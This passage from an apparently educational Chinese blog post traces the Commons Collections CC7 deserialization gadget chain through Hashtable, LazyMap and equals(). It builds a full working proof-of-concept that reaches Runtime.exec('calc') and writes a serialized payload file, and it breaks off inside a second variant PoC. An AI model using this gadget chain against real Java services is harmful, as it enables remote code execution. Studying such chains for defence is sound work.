java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//声明一个Entry变量，用来临时存储读取的数据</span></span><br><span class="line">        Entry&lt;Object, Object&gt; entryStack = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">            <span class="comment">//默认写入非static和transient的属性</span></span><br><span class="line">            <span class="comment">// Write out the length, threshold, loadfactor</span></span><br><span class="line">            s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//写入table表的长度和元素数量</span></span><br><span class="line">            <span class="comment">// Write out length, count of elements</span></span><br><span class="line">            s.writeInt(table.length);</span><br><span class="line">            s.writeInt(count);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//依次读取table表中的键值对，写入到entryStack变量中</span></span><br><span class="line">            <span class="comment">// Stack copies of the entries in the table</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; table.length; index++) &#123;</span><br><span class="line">                Entry&lt;?,?&gt; entry = table[index];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (entry != <span class="literal">null</span>) &#123;</span><br><span class="line">                    entryStack =</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(<span class="number">0</span>, entry.key, entry.value, entryStack);</span><br><span class="line">                    entry = entry.next;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//依次读取entryStack变量中数据，将entry里的Key和value写入</span></span><br><span class="line">        <span class="comment">// Write out the key/value objects from the stacked entries</span></span><br><span class="line">        <span class="keyword">while</span> (entryStack != <span class="literal">null</span>) &#123;</span><br><span class="line">            s.writeObject(entryStack.key);</span><br><span class="line">            s.writeObject(entryStack.value);</span><br><span class="line">            entryStack = entryStack.next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>序列化过程简单来说就是创建一个<code>Entry</code>类型变量<code>entryStack</code>来读取<code>table</code>中的<code>entry</code>数据，再依次读取<code>entryStack</code>中的<code>entry</code>元素中的<code>key</code>和<code>value</code>写入到流中。</p><hr><p>反序列化（readObject）过程</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">         <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//读取默认属性</span></span><br><span class="line">        <span class="comment">// Read in the length, threshold, and loadfactor</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//读取原始table长度和元素成员数量</span></span><br><span class="line">        <span class="comment">// Read the original length of the array and number of elements</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">origlength</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">        <span class="type">int</span> <span class="variable">elements</span> <span class="operator">=</span> s.readInt();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//重新计算table的长度</span></span><br><span class="line">        <span class="comment">// Compute new size with a bit of room 5% to grow but</span></span><br><span class="line">        <span class="comment">// no larger than the original size.  Make the length</span></span><br><span class="line">        <span class="comment">// odd if it&#x27;s large enough, this helps distribute the entries.</span></span><br><span class="line">        <span class="comment">// Guard against the length ending up zero, that&#x27;s not valid.</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> (<span class="type">int</span>)(elements * loadFactor) + (elements / <span class="number">20</span>) + <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span> (length &gt; elements &amp;&amp; (length &amp; <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">            length--;</span><br><span class="line">        <span class="keyword">if</span> (origlength &gt; <span class="number">0</span> &amp;&amp; length &gt; origlength)</span><br><span class="line">            length = origlength;</span><br><span class="line">        <span class="comment">//创建计算好长度的table表</span></span><br><span class="line">        table = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;?,?&gt;[length];</span><br><span class="line">        threshold = (<span class="type">int</span>)Math.min(length * loadFactor, MAX_ARRAY_SIZE + <span class="number">1</span>);</span><br><span class="line">        count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//读取流中所有元素的key和value</span></span><br><span class="line">        <span class="comment">// Read the number of elements and then all the key/value objects</span></span><br><span class="line">        <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line">            <span class="comment">//同步将key和value通过reconstitutionPut方法写入到新创建的table表中</span></span><br><span class="line">            <span class="comment">// synch could be eliminated for performance</span></span><br><span class="line">            reconstitutionPut(table, key, value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>反序列化过程相对也比较好理解，主要就是从流中读取到原始信息，再重新计算长度去创建一个新<code>table</code>表，并读取流中<code>key</code>和<code>value</code>通过<code>reconstitutionPut</code>方法写入到<code>table</code>表中<br>反序列化过程主要只调用了<code>reconstitutionPut</code>方法，该方法比较关键，再跟进<code>reconstitutionPut</code>方法</p><h3 id="reconstitutionPut"><a href="#reconstitutionPut" class="headerlink" title="reconstitutionPut()"></a>reconstitutionPut()</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span><br><span class="line">        <span class="keyword">throws</span> StreamCorruptedException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">        <span class="comment">// This should not happen in deserialized version.</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Creates the new entry.</span></span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">        tab[index] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>同样通过注解也很好理解步骤（主要就是value不允许为Null，然后key值不能重复，元素hash不能相同，也是hashtable的特性）</p><ul><li>先判断value值，如果value为空，就抛出序列化异常</li><li>计算key的hash，再根据hash和table长度计算出存储索引index，并判断该key的hash或者该key的值是否在表中存在，如果已存在就抛出序列化异常</li><li>经过判断没问题后 就将key value写入到Entry中</li></ul><p><code>reconstitutionPut</code>方法中调用了<code>key.hashCode()</code>方法和<code>e.key.equals(key)</code>方法，其中<code>key.hashCode()</code>方法在下面<font color="red">POC延伸</font>中会分析，现在还有<code>e.key.equals(key)</code>方法，在for循环中，判断当前元素的<code>key</code>的<code>hash</code>在表中是否存在，并且会对元素的<code>key</code>对表中元素的<code>key</code>进行<code>equals()</code>匹配查看<code>key</code>是否在表中存在。<br>跟进<code>e.key.equals(key)</code>方法，其中<code>e.key</code>表示从流中读取的<code>table</code>表中的<code>key</code>，也就是我们<code>put</code>进的<code>key</code>值。<br>该链通过<code>Hashtable</code>调用<code>Lazymap</code>，那传入的<code>key</code>值肯定就为<code>Lazymap</code>对象。<br><code>e.key.equals(key)</code>调用相当于<code>e.Lazymap.equals(key)</code></p><p><font color="red">满足条件：</font></p><ul><li>value不能为空，设置value值就行。</li><li>需要<code>index</code>相同且<code>e.hash == hash</code>，也就是在table表中需要有两个元素的hash是相等的，hash相等才能获取到table中的元素，才能去执行<code>e.key.equals(key)</code>这个方法，因此必须put进两个hash相等的元素。</li></ul><h3 id="AbstractMapDecorator-equals"><a href="#AbstractMapDecorator-equals" class="headerlink" title="AbstractMapDecorator.equals()"></a>AbstractMapDecorator.equals()</h3><p>跟进<code>Lazymap.equals()</code>方法，但<code>Lazymap</code>类本身没有<code>equals()</code>方法，实际是调用它的父类<code>AbstractMapDecorator</code>下的<code>equals()</code>方法</p><p><img src="/posts/40ba40f0/cc7-2.png" title="AbstractMapDecorator.equals()"></p><p>其中会判断<code>object</code>对象是否为同一个对象，是的话返回<code>true</code>，如果不是同一个对象，就执行<code>map.equals(object)</code>，其中的<code>map</code>为<code>Lazymap</code>传参的<code>map</code>，也就是<code>hashmap</code>对象</p><p>继续跟进<code>hashmap.equals()</code>方法，同样<code>hashmap</code>本身只有在它的<code>Node</code>子类中存在<code>equals()</code>方法，实际调用的也是父类下的<code>equals()</code>方法</p><h3 id="AbstractMap-equals"><a href="#AbstractMap-equals" class="headerlink" title="AbstractMap.equals()"></a>AbstractMap.equals()</h3><p><img src="/posts/40ba40f0/cc7-3.png" title="AbstractMap.equals()"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="comment">//判断是否是同一个对象</span></span><br><span class="line">        <span class="keyword">if</span> (o == <span class="built_in">this</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//判断该对象是否属于Map类型</span></span><br><span class="line">        <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br><span class="line">        <span class="comment">//判断元素个数是否相同</span></span><br><span class="line">        <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//创建迭代器</span></span><br><span class="line">            Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">            <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">                <span class="comment">//依次获取元素</span></span><br><span class="line">                Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">                <span class="comment">//获取Key和value值</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line">                <span class="comment">//value为空的话执行下面判断体</span></span><br><span class="line">                <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">//value不为空的话执行下面判断体</span></span><br><span class="line">                    <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassCastException unused) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NullPointerException unused) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><font color="red">满足条件：</font></p><ul><li>不能为同一个对象，如果两个元素相同就直接返回true</li><li>该对象类型必须为Map类型，不是Map类型的话返回false</li><li>对象元素个数必须相同，不同的话返回false</li></ul><p>满足以上条件后，由于本身<code>value</code>不能为空（为空就不会进入到这个调用阶段了），因此会执行<code>if (!value.equals(m.get(key)))</code>判断体中的<code>m.get(key)</code>方法，而<code>m</code>对象由传入的<code>Object</code>对象，也就是上面分析传入对比<code>equals()</code>方法中的对象，即<code>Lazymap</code>对象，实际调用<code>Lazymap.get(key)</code>，达到代码执行的目的。</p><h3 id="POC构造"><a href="#POC构造" class="headerlink" title="POC构造"></a>POC构造</h3><p>上面几个关键的方法分析完了，从POC构造继续串联起来分析<br>首先触发点不变</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>接着就是<code>Lazymap</code>的传值和对<code>hashtable</code>之间的衔接，在上面方法的分析中提到<code>reconstitutionPut()</code>方法中需要满足</p><ul><li><code>value</code>不能为空，设置<code>value</code>值就行。</li><li>需要<code>index</code>相同且<code>e.hash == hash</code>，也就是在<code>table</code>表中需要有两个元素的<code>hash</code>是相等的，<code>hash</code>相等才能获取到<code>table</code>中的元素，才能去执行<code>e.key.equals(key)</code>这个方法，因此必须<code>put</code>进两个<code>hash</code>相等的元素。</li></ul><p><img src="/posts/40ba40f0/cc7-4.png" title="满足条件"></p><p>由上满足条件，我们传入两个相同的元素</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">Map Lmap2= LazyMap.decorate(map2,transformerChain);</span><br><span class="line">Lmap.put(<span class="string">&quot;test&quot;</span>,<span class="number">1</span>);</span><br><span class="line">Lmap2.put(<span class="string">&quot;test&quot;</span>,<span class="number">1</span>);</span><br><span class="line">Hashtable ht=<span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">ht.put(Lmap,<span class="number">1</span>);</span><br><span class="line">ht.put(Lmap2,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>但会遇到问题，如果传入两个相同的元素，由于<code>hashtable</code>的<code>put</code>操作</p><p><img src="/posts/40ba40f0/cc7-5.png" title="put()"></p><p>其中针对第一个元素<code>put</code>入的时候，此时<code>Table</code>不存在其他元素，此时<code>index</code>指针获取的<code>table</code>为<code>null</code>，不会进入<code>for</code>循环体，直接进入<code>addEntry()</code>方法中</p><p><img src="/posts/40ba40f0/cc7-6.png" title="addEntry()"></p><p><code>addEntry()</code>方法将元素添加对应元素<code>hash</code>计算出来的<code>index</code>指针的<code>table</code>中，最后计数+1，表示<code>table</code>中新增了一个元素个数</p><p>如果添加两个一模一样的元素，就会导致在第二次<code>put</code>对象时，由于<code>hash</code>相同，计算的<code>index</code>相同，<code>key</code>值相同，进入到<code>put</code>方法的<code>for</code>循环中返回了，自然不会进行<code>addEntry()</code>添加操作，此时<code>table</code>表中元素个数仍为1。</p><p><img src="/posts/40ba40f0/cc7-12.png" title="第二次put"></p><p>在反序列化获取<code>elements</code>元素个数时，此时也为1，只进行一次<code>reconstitutionPut</code>方法调用。而需要调用第二次<code>reconstitutionPut</code>方法，判断里面的<code>hash</code>相同才能运行到<code>e.key.equals(key)</code>方法。</p><p><img src="/posts/40ba40f0/cc7-7.png" title="反序列化过程"></p><p>因此需要我们传入两个元素的hash相同，但是元素key不相同的两组元素</p><p>由上满足条件，我们传入两个元素的hash相同，但是元素key不相同的两组元素</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">Map Lmap2= LazyMap.decorate(map2,transformerChain);</span><br><span class="line">Lmap.put(<span class="string">&quot;yy&quot;</span>,<span class="number">1</span>);</span><br><span class="line">Lmap2.put(<span class="string">&quot;zZ&quot;</span>,<span class="number">1</span>);</span><br><span class="line">Hashtable ht=<span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">ht.put(Lmap,<span class="number">1</span>);</span><br><span class="line">ht.put(Lmap2,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p><img src="/posts/40ba40f0/cc7-8.png" title="hash相同的元素"></p><p>再解决本地触发的问题，由于在第二次<code>put</code>中会进入到循环体中执行<code>e.key.equals(key)</code>方法，会调用到<code>transformerChain.transform()</code>达到执行代码。</p><p>规避这个问题还是用老方法，先传入空的转换器进<code>Lazymap</code>对象中，<code>put</code>完值后再通过反射修改转换器。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建一个空的链转换器</span></span><br><span class="line">Transformer[] transformersfake = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line"><span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChainfake</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformersfake);</span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">Map Lmap2= LazyMap.decorate(map2,transformerChainfake);</span><br><span class="line">Lmap.put(<span class="string">&quot;yy&quot;</span>,<span class="number">1</span>);</span><br><span class="line">Lmap2.put(<span class="string">&quot;zZ&quot;</span>,<span class="number">1</span>);</span><br><span class="line">Hashtable ht=<span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">ht.put(Lmap,<span class="number">1</span>);</span><br><span class="line">ht.put(Lmap2,<span class="number">1</span>);</span><br><span class="line"><span class="comment">//修改触发的转换器</span></span><br><span class="line">Field field=LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(Lmap2,transformerChain);</span><br></pre></td></tr></table></figure><p>由于<code>put</code>第二次的时候<code>e.key.equals(key)</code>中的<code>e.key</code>为第一次元素的<code>Key</code>，目的是拿第二次<code>put</code>的<code>key</code>查看是否跟表中的<code>key</code>是否相等，而参数中的<code>key</code>(第二次put入的key值)为最后调用的<code>m.get()</code>中的<code>m</code>对象，因此只需要修改第二个传入的<code>lazymap</code>对象的<code>factory</code>即可。</p><p><img src="/posts/40ba40f0/cc7-11.png" title="触发点对象"></p><p>还有个点就是由于在<code>put</code>入第二个<code>entry</code>元素时，调用了<code>e.key.equals(key)</code>方法，最后调用到<code>m.get(key)</code>即<code>Lazymap.get(key)</code>方法</p><p><img src="/posts/40ba40f0/cc7-9.png" title="Lazymap.get(key)"></p><p>由于转换器制空后，本地不会触发代码执行，但会进行<code>map.put(key, value);</code>，将第二个元素的<code>key</code>进行<code>put</code>操作，此时<code>Lazymap2</code>又新增了一个<code>key</code>为<code>yy</code>的元素，因此需要删除</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Lmap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="/posts/40ba40f0/cc7-10.png" title="新增的yy"></p><p>最后将<code>hashtable</code>对象进行序列化，反序列化的时候触发漏洞，得到完整poc：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//创建一个空的链转换器</span></span><br><span class="line">        Transformer[] transformersfake = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChainfake</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformersfake);</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">        Map Lmap2= LazyMap.decorate(map2,transformerChainfake);</span><br><span class="line">        Lmap.put(<span class="string">&quot;yy&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        Lmap2.put(<span class="string">&quot;zZ&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        Hashtable ht=<span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        ht.put(Lmap,<span class="number">1</span>);</span><br><span class="line">        ht.put(Lmap2,<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//修改触发的转换器</span></span><br><span class="line">        Field field=LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(Lmap2,transformerChain);</span><br><span class="line">        Lmap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc7payload-2.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(ht);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc7payload-2.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="CC7-POC延伸"><a href="#CC7-POC延伸" class="headerlink" title="CC7-POC延伸"></a>CC7-POC延伸</h2><p>反序列化（readObject）过程中提到的<code>reconstitutionPut</code>方法</p><p><img src="/posts/40ba40f0/cc7-13.png" title="hashCode()"></p><p>在上面反序列化过程<code>reconstitutionPut</code>方法写入<code>entry</code>中发现一个敏感的<font color="red">key.hashCode()</font>，在cc6的学习中就是利用<code>hashmap.put(key,value)</code>调用<code>hash(key)</code>方法最后调用<code>key.hashcode()</code>进行调用达到代码执行。<br>同样在这里，key值可控，也是通过<code>hashtable</code>对象<code>put</code>入的<code>key</code>值进行<code>hashCode()</code>操作，跟cc6基本没差别，这就不再复分析一遍了。<br>得到一个延伸的poc<br>触发点不变</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, 